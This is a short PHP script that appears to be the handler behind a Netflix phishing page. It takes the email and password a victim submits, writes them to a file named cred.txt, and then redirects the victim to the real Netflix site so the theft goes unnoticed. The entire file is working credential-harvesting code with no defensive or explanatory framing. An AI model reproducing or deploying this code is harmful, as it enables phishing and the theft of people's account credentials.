<?php

file_put_contents("cred.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
